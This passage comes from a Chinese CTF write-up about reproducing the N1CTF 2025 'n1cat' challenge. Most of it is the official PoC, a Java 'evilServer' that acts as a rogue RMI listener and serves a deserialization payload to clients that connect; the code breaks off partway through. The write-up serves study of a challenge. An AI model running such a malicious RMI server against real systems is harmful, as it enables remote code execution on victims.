+<p>而后我又尝试了探测 pom.xml 等配置文件期望从中获取所有依赖和版本信息（虽然默认 war 包是没什么这种文件的，但万一用的是 maven 或者 Gradle 之类的呢），然而事实上并没有找到。由于当时还是耐心不够，只 fuzz 了 class 文件和一些常见配置文件，没去把依赖的一个个搞出来，后面做题也没找到可用的利用链，基本就 game over 了，想想还是有点傻。。。还是要多试。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>如果要根据 war 包在 IDEA 构建项目，注意 servlet 会因缺少依赖报错，需要自行导入 Tomcat 中的 servlet-api.jar 包，本题下载 <a target="_blank" rel="noopener" href="https://mirrors.huaweicloud.com/apache/tomcat/tomcat-9/v9.0.108/bin/apache-tomcat-9.0.108.zip">Tomcat9.0.108</a> 后在 lib 目录中找到 servlet-api.jar，导入 IDEA 项目依赖。下图为本题所有依赖</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/EnbpbrYQsoTAkrxfi8scQucPn4b.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试使用官方 poc 进行复现，内容如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ctf.n1cat;<br><br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.BufferedOutputStream;<br><span class="hljs-keyword">import</span> java.io.DataInputStream;<br><span class="hljs-keyword">import</span> java.io.DataOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> org.slf4j.Logger;<br><span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilServer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//before you start it, you should set vm options:&quot;--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED&quot;</span><br>        evilServer._start_();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger _log _= LoggerFactory._getLogger_(evilServer.class);<br>    <span class="hljs-keyword">public</span> String ip;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> evilServer _serverInstance_;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">evilServer</span><span class="hljs-params">(String ip, <span class="hljs-type">int</span> port)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ip = ip;<br>            <span class="hljs-built_in">this</span>.port = port;<br>            <span class="hljs-built_in">this</span>.ss = ServerSocketFactory._getDefault_().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> &#123;<br>        _serverInstance _= <span class="hljs-keyword">new</span> <span class="hljs-title class_">evilServer</span>(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">8899</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">serverThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(_serverInstance_);<br>        serverThread.start();<br>        _log_.warn(<span class="hljs-string">&quot;[RMI Server] is already running.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (_serverInstance _!= <span class="hljs-literal">null</span>) &#123;<br>            _serverInstance_.exit = <span class="hljs-literal">true</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                _serverInstance_.ss.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br><br>            _serverInstance _= <span class="hljs-literal">null</span>;<br>            _log_.info(<span class="hljs-string">&quot;[RMI Server] stopped.&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.hadConnection) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                _log_.info(<span class="hljs-string">&quot;[RMI Server] Waiting for connection&quot;</span>);<br>                <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.waitLock) &#123;<br>                    <span class="hljs-built_in">this</span>.waitLock.wait((<span class="hljs-type">long</span>)i);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException var5) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var4) &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.waitLock) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        _log_.info(<span class="hljs-string">&quot;[RMI Server] Listening on &#123;&#125;:&#123;&#125;&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;8899&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">this</span>.exit &amp;&amp; (s = <span class="hljs-built_in">this</span>.ss.accept()) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress)s.getRemoteSocketAddress();<br>                        _log_.info(<span class="hljs-string">&quot;[RMI Server] Have connection from &quot;</span> + remote);<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> (InputStream)(is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is));<br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">Throwable</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br>                            <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                            <span class="hljs-keyword">if</span> (magic == <span class="hljs-number">1246907721</span> &amp;&amp; version == <span class="hljs-number">2</span>) &#123;<br>                                <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                                <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                                <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br>                                <span class="hljs-type">Throwable</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                                    <span class="hljs-keyword">switch</span> (protocol) &#123;<br>                                        <span class="hljs-keyword">case</span> <span class="hljs-number">75</span>:<br>                                            out.writeByte(<span class="hljs-number">78</span>);<br>                                            <span class="hljs-keyword">if</span> (remote.getHostName() != <span class="hljs-literal">null</span>) &#123;<br>                                                out.writeUTF(remote.getHostName());<br>                                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                                out.writeUTF(remote.getAddress().toString());<br>                                            &#125;<br><br>                                            out.writeInt(remote.getPort());<br>                                            out.flush();<br>                                            in.readUTF();<br>                                            in.readInt();<br>                                        <span class="hljs-keyword">case</span> <span class="hljs-number">76</span>:<br>                                            <span class="hljs-built_in">this</span>.doMessage(s, in, out);<br>                                            bufOut.flush();<br>                                            out.flush();<br>                                            <span class="hljs-keyword">break</span>;<br>                                        <span class="hljs-keyword">case</span> <span class="hljs-number">77</span>:<br>                                        <span class="hljs-keyword">default</span>:<br>                                            _log_.info(<span class="hljs-string">&quot;[RMI Server] Unsupported protocol&quot;</span>);<br>                                            s.close();<br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">catch</span> (Throwable var88) &#123;<br>                                    var12 = var88;<br>                                    <span class="hljs-keyword">throw</span> var88;<br>                                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                                    <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span>) &#123;<br>                                        <span class="hljs-keyword">if</span> (var12 != <span class="hljs-literal">null</span>) &#123;<br>                                            <span class="hljs-keyword">try</span> &#123;<br>                                                out.close();<br>                                            &#125; <span class="hljs-keyword">catch</span> (Throwable var87) &#123;<br>                                                var12.addSuppressed(var87);<br>                                            &#125;<br>                                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                                            out.close();<br>                                        &#125;<br>                                    &#125;<br><br>                                &#125;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                s.close();<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">catch</span> (Throwable var90) &#123;<br>                            var6 = var90;<br>                            <span class="hljs-keyword">throw</span> var90;<br>                        &#125; <span class="hljs-keyword">finally</span> &#123;<br>                            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">if</span> (var6 != <span class="hljs-literal">null</span>) &#123;<br>                                    <span class="hljs-keyword">try</span> &#123;<br>                                        in.close();<br>                                    &#125; <span class="hljs-keyword">catch</span> (Throwable var86) &#123;<br>                                        var6.addSuppressed(var86);<br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    in.close();<br>                                &#125;<br>                            &#125;<br><br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (InterruptedException var92) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                        e.printStackTrace(System._err_);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        _log_.info(<span class="hljs-string">&quot;[RMI Server] Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span>;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>) &#123;<br>                    s.close();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SocketException var96) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace(System._err_);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span><span class="hljs-params">(Socket s, DataInputStream in, DataOutputStream out)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        _log_.info(<span class="hljs-string">&quot;[RMI Server] Reading message...&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br>        <span class="hljs-keyword">switch</span> (op) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">80</span>:<br>                <span class="hljs-built_in">this</span>.doCall(s, in, out);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">81</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">83</span>:<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">82</span>:<br>                out.writeByte(<span class="hljs-number">83</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">84</span>:<br>                UID._read_(in);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span><span class="hljs-params">(Socket s, DataInputStream in, DataOutputStream out)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.lang.String&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> String.class;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID._read_(ois);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (read.hashCode() == <span class="hljs-number">2</span>) &#123;<br>            _handleDGC_(ois);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (read.hashCode() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handleRMI(s, ois, out)) &#123;<br>                <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.waitLock) &#123;<br>                    <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            s.close();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">handleRMI</span><span class="hljs-params">(Socket s, ObjectInputStream ois, DataOutputStream out)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ois.readInt();<br>        ois.readLong();<br>        <span class="hljs-keyword">if</span> (method != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> (String)ois.readObject();<br>            out.writeByte(<span class="hljs-number">81</span>);<br><br>            Object obj;<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(out, <span class="hljs-string">&quot;evil&quot;</span>)) &#123;<br>                oos.writeByte(<span class="hljs-number">1</span>);<br>                (<span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>()).write(oos);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + object;<br>                _log_.info(<span class="hljs-string">&quot;[RMI Server] Send payloadData for &quot;</span> + path);<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                obj = PayloadGenerator._getPayload_();<br>                oos.writeObject(obj);<br>                oos.flush();<br>                out.flush();<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDGC</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ois.readInt();<br>        ois.readLong();<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarshalOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br>        <span class="hljs-keyword">private</span> String sendUrl;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MarshalOutputStream</span><span class="hljs-params">(OutputStream out, String u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>            <span class="hljs-built_in">this</span>.sendUrl = u;<br>        &#125;<br><br>        MarshalOutputStream(OutputStream out) <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">annotateClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.sendUrl != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.writeObject(<span class="hljs-built_in">this</span>.sendUrl);<br>            &#125; <span 